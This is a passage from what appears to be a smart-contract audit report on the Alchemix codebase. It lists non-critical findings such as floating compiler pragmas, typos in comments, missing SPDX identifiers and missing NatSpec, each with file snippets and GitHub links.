^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Limiters.sol#L1\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Tick.sol   #9\r\n\r\n2:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Tick.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #10\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Stake.sol   #11\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Stake.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #12\r\n\r\n1:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L1\r\n\r\n### 10. Use a more recent version of solidity\r\nUse a solidity version of at least 0.8.4 to get `bytes.concat()` instead of `abi.encodePacked(<bytes>,<bytes>)`\r\nUse a solidity version of at least 0.8.12 to get `string.concat()` instead of `abi.encodePacked(<str>,<str>)`\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/libraries/RocketPool.sol   #1\r\n\r\n1:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/RocketPool.sol#L1\r\n\r\n### 11. Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)\r\n\r\n*There are 2 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/libraries/LiquidityMath.sol   #1\r\n\r\n41:       return (input * (10**18)) / (10**decimals);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/LiquidityMath.sol#L41\r\n\r\n```solidity\r\nFile: contracts-full/libraries/LiquidityMath.sol   #2\r\n\r\n46:       return (input * (10**decimals)) / (10**18);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/LiquidityMath.sol#L46\r\n\r\n### 12. Inconsistent spacing in comments\r\nSome lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file\r\n\r\n*There are 11 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/interfaces/IAaveLendingPool.sol   #1\r\n\r\n4:      // refer to the whitepaper, section 1.1 basic concepts for a formal description of these properties.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IAaveLendingPool.sol#L4\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #2\r\n\r\n6:      // Stores the reserve configuration.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L6\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #3\r\n\r\n8:      // The liquidity index. Expressed in ray.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L8\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #4\r\n\r\n10:     // Variable borrow index. Expressed in ray.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L10\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #5\r\n\r\n12:     // The current supply rate. Expressed in ray.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L12\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #6\r\n\r\n14:     // The current variable borrow rate. Expressed in ray.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L14\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #7\r\n\r\n16:     // The current stable borrow rate. Expressed in ray.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L16\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #8\r\n\r\n19:     // Tokens addresses.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L19\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #9\r\n\r\n23:     // Address of the interest rate strategy.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L23\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/aave/DataTypes.sol   #10\r\n\r\n25:     // The id of the reserve. Represents the position in the list of the active reserves.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/aave/DataTypes.sol#L25\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #11\r\n\r\n102:    ///ck\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L102\r\n\r\n### 13. Non-library/interface files should use fixed compiler versions, not floating ones\r\n\r\n*There are 16 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveMetapool.sol   #1\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveMetapool.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2Base.sol   #2\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2Base.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterBuffer.sol   #3\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterBuffer.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/StakingPools.sol   #4\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/StakingPools.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalAlchemicTokenV2.sol   #5\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalAlchemicTokenV2.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/utils/Whitelist.sol   #6\r\n\r\n1:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/utils/Whitelist.sol#L1\r\n\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveFactoryethpool.sol   #7\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveFactoryethpool.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV1.sol   #8\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV1.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #9\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/adapters/yearn/YearnTokenAdapter.sol   #10\r\n\r\n1:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/yearn/YearnTokenAdapter.sol#L1\r\n\r\n```solidity\r\nFile: contracts-full/gALCX.sol   #11\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/gALCX.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV2.sol   #12\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemicTokenV2.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalGALCX.sol   #13\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalGALCX.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalBase.sol   #14\r\n\r\n2:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalBase.sol#L2\r\n\r\n```solidity\r\nFile: contracts-full/WETHGateway.sol   #15\r\n\r\n1:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/WETHGateway.sol#L1\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #16\r\n\r\n1:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L1\r\n\r\n### 14. Typos\r\n\r\n*There are 12 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/TransmuterV2.sol   #1\r\n\r\n/// @audit identitifer\r\n101:    /// @dev The identitifer of the sentinel role\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterV2.sol#L101\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ICurveFactoryethpool.sol   #2\r\n\r\n/// @audit valie\r\n7:        /// @param j Index valie of the underlying coin to recieve\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ICurveFactoryethpool.sol#L7\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ICurveFactoryethpool.sol   #3\r\n\r\n/// @audit recieve\r\n7:        /// @param j Index valie of the underlying coin to recieve\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ICurveFactoryethpool.sol#L7\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ICurveMetapool.sol   #4\r\n\r\n/// @audit valie\r\n7:        /// @param j Index valie of the underlying coin to recieve\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ICurveMetapool.sol#L7\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ICurveMetapool.sol   #5\r\n\r\n/// @audit recieve\r\n7:        /// @param j Index valie of the underlying coin to recieve\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ICurveMetapool.sol#L7\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterBuffer.sol   #6\r\n\r\n/// @audit recieved\r\n211:    /// @param minimumAmountOut The minimum amount of underlying tokens needed to be recieved as a result of unwrapping the yield tokens.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterBuffer.sol#L211\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/transmuter/ITransmuterV2.sol   #7\r\n\r\n/// @audit coversion\r\n102:    /// @return The coversion factor.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/transmuter/ITransmuterV2.sol#L102\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ITransmuterBuffer.sol   #8\r\n\r\n/// @audit recieved\r\n177:      /// @param minimumAmountOut The minimum amount of underlying tokens needed to be recieved as a result of unwrapping the yield tokens.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ITransmuterBuffer.sol#L177\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #9\r\n\r\n/// @audit underying\r\n297:      /// @return The amount of the underying.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L297\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Limiters.sol   #10\r\n\r\n/// @audit determins\r\n29:       /// @param blocks  The number of blocks that determins the rate of the LGF.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Limiters.sol#L29\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Limiters.sol   #11\r\n\r\n/// @audit LFG\r\n53:       /// @param maximum The maximum value of the LFG.\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Limiters.sol#L53\r\n\r\n```solidity\r\nFile: contracts-full/libraries/pools/Pool.sol   #12\r\n\r\n/// @audit ck\r\n102:    ///ck\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/pools/Pool.sol#L102\r\n\r\n### 15. File does not contain an SPDX Identifier\r\n\r\n*There are 32 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/utils/Whitelist.sol   #1\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/utils/Whitelist.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/base/Errors.sol   #2\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/base/Errors.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/adapters/yearn/YearnTokenAdapter.sol   #3\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/yearn/YearnTokenAdapter.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IWhitelist.sol   #4\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IWhitelist.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IERC20Mintable.sol   #5\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IERC20Mintable.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ICurveFactoryethpool.sol   #6\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ICurveFactoryethpool.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ICurveMetapool.sol   #7\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ICurveMetapool.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IAaveFlashLoanReceiver.sol   #8\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IAaveFlashLoanReceiver.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IWETH9.sol   #9\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IWETH9.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IERC20Burnable.sol   #10\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IERC20Burnable.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IAaveLendingPool.sol   #11\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IAaveLendingPool.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/IWETH9.sol   #12\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/IWETH9.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/external/tether/ITetherToken.sol   #13\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/external/tether/ITetherToken.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IAlchemistV2.sol   #14\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IAlchemistV2.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ITokenAdapter.sol   #15\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ITokenAdapter.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IWETHGateway.sol   #16\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IWETHGateway.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IERC20Minimal.sol   #17\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IERC20Minimal.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IERC20TokenReceiver.sol   #18\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IERC20TokenReceiver.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Actions.sol   #19\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Actions.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #20\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2State.sol   #21\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2State.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2AdminActions.sol   #22\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2AdminActions.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Errors.sol   #23\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Errors.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Immutables.sol   #24\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Immutables.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IERC20Metadata.sol   #25\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IERC20Metadata.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Sets.sol   #26\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Sets.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/libraries/Limiters.sol   #27\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/Limiters.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/libraries/RocketPool.sol   #28\r\n\r\n0:    pragma solidity >=0.5.0;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/RocketPool.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/libraries/TokenUtils.sol   #29\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/libraries/TokenUtils.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/WETHGateway.sol   #30\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/WETHGateway.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/TransmuterConduit.sol   #31\r\n\r\n0:    pragma solidity 0.8.13;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/TransmuterConduit.sol#L0\r\n\r\n```solidity\r\nFile: contracts-full/AlchemistV2.sol   #32\r\n\r\n0:    pragma solidity ^0.8.11;\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AlchemistV2.sol#L0\r\n\r\n### 16. File is missing NatSpec\r\n\r\n*There are 27 instances of this issue:*\r\n```solidity\r\nFile: contracts-full/AutoleverageCurveMetapool.sol (various lines)   #1\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/AutoleverageCurveMetapool.sol\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalAlchemicTokenV2.sol (various lines)   #2\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalAlchemicTokenV2.sol\r\n\r\n```solidity\r\nFile: contracts-full/adapters/yearn/YearnTokenAdapter.sol (various lines)   #3\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/adapters/yearn/YearnTokenAdapter.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/lido/IWstETH.sol (various lines)   #4\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/lido/IWstETH.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/lido/IStETH.sol (various lines)   #5\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/lido/IStETH.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/curve/IStableSwap2Pool.sol (various lines)   #6\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/curve/IStableSwap2Pool.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/curve/IEthStableMetaPool.sol (various lines)   #7\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/curve/IEthStableMetaPool.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/curve/IStableSwap3Pool.sol (various lines)   #8\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/curve/IStableSwap3Pool.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/convex/IConvexToken.sol (various lines)   #9\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/convex/IConvexToken.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/convex/IConvexBooster.sol (various lines)   #10\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/convex/IConvexBooster.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/convex/IConvexRewards.sol (various lines)   #11\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/convex/IConvexRewards.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IAaveLendingPool.sol (various lines)   #12\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IAaveLendingPool.sol\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/rocket/IRocketStorage.sol (various lines)   